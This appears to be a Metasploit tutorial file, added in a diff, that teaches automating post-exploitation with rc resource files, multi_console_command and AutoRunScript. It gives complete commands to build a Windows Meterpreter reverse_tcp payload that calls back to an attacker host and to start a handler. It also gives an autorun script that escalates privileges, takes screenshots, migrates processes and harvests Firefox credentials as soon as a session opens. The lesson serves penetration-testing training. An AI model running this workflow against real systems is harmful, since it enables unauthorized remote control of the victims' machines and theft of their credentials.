@@ -1,0 +1,87 @@
+                                              [ RC / ERB scripting lesson 4 ]
+
+
+
+                                                   exercise description:
+             "This exercise will teach how to run your rc file using multi_console_command and AutoRunScript"
+                   auto-run scripts are great when you need to perform/run various modules automatically.
+                   One of them its the 'multi_console_command' Meterpreter script for running multiple
+                   console commands on a meterpreter session "Provided by Carlos Perez @darkoperator"
+
+
+
+
+
+                    1º build 'autorun.rc' resource file:
+                    "open text editor and copy/paste"
+                    -------------------------------------
+                    getsystem
+                    screenshot -v -p IClass.jpeg -v true
+                    run post/windows/manage/migrate
+                    run post/windows/gather/checkvm
+                    run post/multi/gather/firefox_creds
+                    run post/windows/gather/enum_logged_on_users
+                    run post/windows/gather/enum_applications
+
+
+
+                    2º build one binary payload
+                    ---------------------------
+                    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o /root/payload.exe
+
+
+                    3º start a multi-handler
+                    ---------------------------
+                    msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.69; set LPORT 666; exploit'
+
+
+                    4º execute payload in target system
+                    -----------------------------------
+
+
+                    5º run resource file from meterpreter prompt
+                    ---------------------------------------------
+                    meterpreter > run multi_console_command -rc /root/autorun.rc
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+
+
+                                                   exercise description:
+                    Another great script its "AutoRunScript" that allow us to automatically run post-modules
+                    "upon session creation". The follow exercise will use AutoRunScript module to execute the
+                    darkoperator "multi_console_command" as soon the attacker gets the connection (session).
+
+
+
+                    6º exit meterpreter console/session:
+                    ------------------------------------
+                    meterpreter > exit
+                    msf exploit(handler) > exit -y
+
+
+                    7º open terminal and write:
+                    ---------------------------
+                    msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.69; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc /root/autorun.rc; exploit'
+
+
+                    8º execute payload in target system
+                    -----------------------------------
+
+
+
+
+                    9º clean things up in the end:
+                    ------------------------------
+                    meterpreter > exit
+                    msf exploit(handler) > exit -y
+
+
+
+
+EOF
